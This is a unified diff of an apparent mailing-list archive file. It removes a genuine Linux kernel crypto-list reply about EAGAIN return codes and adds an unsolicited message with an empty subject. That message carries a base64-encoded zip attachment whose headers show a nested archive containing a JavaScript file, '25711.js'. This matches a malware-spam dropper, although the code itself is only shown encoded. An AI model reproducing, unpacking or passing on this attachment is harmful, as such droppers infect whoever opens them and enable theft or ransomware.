@@ -1,62 +1,64 @@
-From: Herbert Xu <herbert@gondor.apana.org.au>
-Subject: Re: [PATCH v9 00/20] simplify crypto wait for async op
-Date: Sun, 15 Oct 2017 23:38:31 +0800
-Message-ID: <20171015153831.GA22867@gondor.apana.org.au>
-References: <1508059209-25529-1-git-send-email-gilad@benyossef.com>
+From: <fwkz4811-DoVvmRvd3PAA2dtGD8cC2w@public.gmane.org>
+Subject: (unknown)
+Date: Mon, 16 Oct 2017 01:23:31 -0000
+Message-ID: <150811701129.32756.8144755778539993408@scapriotti.plus.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Cc: Mike Snitzer <snitzer@redhat.com>, linux-doc@vger.kernel.org,
-	Gary Hook <gary.hook@amd.com>,
-	David Howells <dhowells@redhat.com>, dm-devel@redhat.com,
-	keyrings@vger.kernel.org, linux-ima-devel@lists.sourceforge.net,
-	Alasdair Kergon <agk@redhat.com>,
-	Steffen Klassert <steffen.klassert@secunet.com>,
-	Boris Brezillon <boris.brezillon@free-electrons.com>,
-	Jonathan Corbet <corbet@lwn.net>, Alexey Kuznetsov <kuznet@ms2.inr.ac.ru>,
-	Mimi Zohar <zohar@linux.vnet.ibm.com>,
-	"Serge E. Hallyn" <serge@hallyn.com>,
-	Tom Lendacky <thomas.lendacky@amd.com>,
-	linux-cifs@vger.kernel.org, linux-ima-user@lists.sourceforge.net,
-	Arnaud Ebalard <arno@natisbad.org>, linux-fscrypt@vger.kernel.org,
-	linux-mediatek@lists.infradead.org,
-	James Morris <james.l.morris@oracle.com>,
-	Matthias Brugger <matthias.bgg@gmail.com>,
-	Jaegeuk Kim <jaegeuk@kernel.org>, linux-arm-kernel@lists.infradead.org,
-	Ofir Dra
-To: Gilad Ben-Yossef <gilad@benyossef.com>
-Return-path: <dm-devel-bounces@redhat.com>
-Content-Disposition: inline
-In-Reply-To: <1508059209-25529-1-git-send-email-gilad@benyossef.com>
-List-Unsubscribe: <https://www.redhat.com/mailman/options/dm-devel>,
-	<mailto:dm-devel-request@redhat.com?subject=unsubscribe>
-List-Archive: <https://www.redhat.com/archives/dm-devel>
-List-Post: <mailto:dm-devel@redhat.com>
-List-Help: <mailto:dm-devel-request@redhat.com?subject=help>
-List-Subscribe: <https://www.redhat.com/mailman/listinfo/dm-devel>,
-	<mailto:dm-devel-request@redhat.com?subject=subscribe>
-Sender: dm-devel-bounces@redhat.com
-Errors-To: dm-devel-bounces@redhat.com
-List-Id: linux-cifs.vger.kernel.org
+Content-Type: application/zip; name="60336090.zip"
+Content-Transfer-Encoding: base64
+To: <linux-cifs-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
+Return-path: <linux-cifs-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
+Content-Disposition: attachment
+Subject: 
+Sender: linux-cifs-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
+List-ID: <linux-cifs.vger.kernel.org>
 
-On Sun, Oct 15, 2017 at 10:19:45AM +0100, Gilad Ben-Yossef wrote:
->
-> Changes from v8:
-> - Remove the translation of EAGAIN return code to the
->   previous return code of EBUSY for the user space
->   interface of algif as no one seems to rely on it as
->   requested by Herbert Xu.
-
-Sorry, but I forgot to mention that EAGAIN is not a good value
-to use because it's used by the network system calls for other
-meanings (interrupted by a signal).
-
-So if we stop doing the translation then we also need to pick
-a different value, perhaps E2BIG or something similar that have
-no current use within the crypto API or network API.
-
-Thanks,
--- 
-Email: Herbert Xu <herbert@gondor.apana.org.au>
-Home Page: http://gondor.apana.org.au/~herbert/
-PGP Key: http://gondor.apana.org.au/~herbert/pubkey.txt
+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
